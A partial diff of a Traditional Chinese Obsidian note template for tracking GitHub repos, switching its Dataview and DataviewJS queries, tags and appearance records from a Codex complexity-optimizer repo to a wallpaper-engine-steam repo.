-> WHERE subcategory = "代碼分析" AND file.name != "Kappaemme-git--codex-complexity-optimizer"
+> WHERE subcategory = "桌面工具" AND file.name != "xw7872081123--wallpaper-engine-steam"
 > SORT stars DESC
 > ```
 
@@ -417,7 +435,7 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 > ```dataview
 > TABLE stars, install_complexity AS "難度", status
 > FROM "Repos"
-> WHERE category = "開發工具" AND file.name != "Kappaemme-git--codex-complexity-optimizer"
+> WHERE category = "其他" AND file.name != "xw7872081123--wallpaper-engine-steam"
 > SORT stars DESC
 > LIMIT 8
 > ```
@@ -426,7 +444,7 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 > ```dataview
 > TABLE stars_per_day AS "Stars/天", category AS "分類", use_case AS "用途"
 > FROM "Repos"
-> WHERE language = "Python" AND file.name != "Kappaemme-git--codex-complexity-optimizer" AND status != "archived"
+> WHERE language = "TypeScript" AND file.name != "xw7872081123--wallpaper-engine-steam" AND status != "archived"
 > SORT stars_per_day DESC
 > LIMIT 5
 > ```
@@ -435,15 +453,15 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 > ```dataview
 > TABLE category AS "分類", stars, stars_per_day AS "stars/天"
 > FROM "Repos"
-> WHERE week = "2026-W21" AND file.name != "Kappaemme-git--codex-complexity-optimizer"
+> WHERE week = "2026-W21" AND file.name != "xw7872081123--wallpaper-engine-steam"
 > SORT stars DESC
 > ```
 
 > [!note]- 共用概念的相關專案
 > ```dataviewjs
-> const concepts = ["程式碼生成","自動化測試","性能優化"];
+> const concepts = ["桌面自訂","動畫壁紙","社群創作"];
 > const pages = dv.pages('"Repos"')
->   .where(p => p.file.name !== "Kappaemme-git--codex-complexity-optimizer" && p.file.outlinks?.some(l => concepts.some(c => l.path?.includes(c))))
+>   .where(p => p.file.name !== "xw7872081123--wallpaper-engine-steam" && p.file.outlinks?.some(l => concepts.some(c => l.path?.includes(c))))
 >   .sort(p => p.stars, "desc")
 >   .limit(5);
 > if (pages.length > 0) {
@@ -456,12 +474,12 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 
 > [!note]- Ring 更高的同類競品
 > ```dataviewjs
-> const me = dv.page("Repos/Kappaemme-git--codex-complexity-optimizer");
+> const me = dv.page("Repos/xw7872081123--wallpaper-engine-steam");
 > if (me) {
 >   const ringOrder = { hold: 0, assess: 1, trial: 2, adopt: 3 };
 >   const myRing = ringOrder[me.ring] || 0;
 >   const better = dv.pages('"Repos"')
->     .where(p => p.file.name !== "Kappaemme-git--codex-complexity-optimizer" && p.category === me.category && (ringOrder[p.ring] || 0) > myRing)
+>     .where(p => p.file.name !== "xw7872081123--wallpaper-engine-steam" && p.category === me.category && (ringOrder[p.ring] || 0) > myRing)
 >     .sort(p => p.stars_per_day || 0, "desc").limit(5);
 >   if (better.length > 0) {
 >     dv.table(["專案", "Ring", "Stars/天", "安裝", "用途"], better.map(p => [
@@ -477,7 +495,7 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 > ```dataview
 > TABLE stars AS "Stars", category AS "分類", status AS "狀態"
 > FROM "Repos"
-> WHERE owner = "Kappaemme-git" AND file.name != "Kappaemme-git--codex-complexity-optimizer"
+> WHERE owner = "xw7872081123" AND file.name != "xw7872081123--wallpaper-engine-steam"
 > SORT stars DESC
 > ```
 
@@ -485,7 +503,7 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 
 > [!abstract]- 這個專案在 vault 中的相對位置
 > ```dataviewjs
-> const me = dv.page("Repos/Kappaemme-git--codex-complexity-optimizer");
+> const me = dv.page("Repos/xw7872081123--wallpaper-engine-steam");
 > const all = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars_per_day || 0, "desc");
 > const rank = all.array().findIndex(p => p.file.name === me?.file?.name) + 1;
 > const catAll = all.where(p => p.category === me?.category);
@@ -502,7 +520,7 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 
 > [!abstract]- Stars 成長追蹤
 > ```dataviewjs
-> const me = dv.page("Repos/Kappaemme-git--codex-complexity-optimizer");
+> const me = dv.page("Repos/xw7872081123--wallpaper-engine-steam");
 > if (me?.star_history) {
 >   const raw = me.star_history.toString();
 >   const points = raw.split(",").map(p => { const [d, s] = p.split(":"); return { date: d, stars: parseInt(s) }; }).filter(p => !isNaN(p.stars));
@@ -535,7 +553,7 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 
 > [!abstract]- 跟 vault 中同類專案比較
 > ```dataviewjs
-> const me = dv.page("Repos/Kappaemme-git--codex-complexity-optimizer");
+> const me = dv.page("Repos/xw7872081123--wallpaper-engine-steam");
 > if (me) {
 >   const all = dv.pages('"Repos"').where(p => p.status !== "archived");
 >   const sameCat = all.where(p => p.category === me.category);
@@ -559,7 +577,7 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 
 > [!abstract]- 綜合評估（自動計算）
 > ```dataviewjs
-> const me = dv.page("Repos/Kappaemme-git--codex-complexity-optimizer");
+> const me = dv.page("Repos/xw7872081123--wallpaper-engine-steam");
 > if (me) {
 >   let score = 0;
 >   let breakdown = [];
@@ -596,7 +614,7 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 
 > [!abstract]- 評估進度
 > ```dataviewjs
-> const me = dv.page("Repos/Kappaemme-git--codex-complexity-optimizer");
+> const me = dv.page("Repos/xw7872081123--wallpaper-engine-steam");
 > if (me) {
 >   const steps = [
 >     { name: "已讀", done: me.status && me.status !== "to-review" },
@@ -679,7 +697,7 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 
 _按時間記錄，每次接觸時追加一段（最新在上）_
 
-> **2026-05-19** — 首次收錄
+> **2026-05-22** — 首次收錄
 > _第一印象：_
 
 **狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`
@@ -695,7 +713,4 @@ _按時間記錄，每次接觸時追加一段（最新在上）_
 
 ## 出現記錄
 
-- [[2026-05-22|2026-05-22]] — 再次上榜，819 stars
-- [[2026-05-21|2026-05-21]] — 再次上榜，805 stars
-- [[2026-05-20|2026-05-20]] — 再次上榜，788 stars
-- [[2026-05-19|2026-05-19]] — 首次收錄，749 stars
+- [[2026-05-22|2026-05-22]] — 首次收錄，618 stars
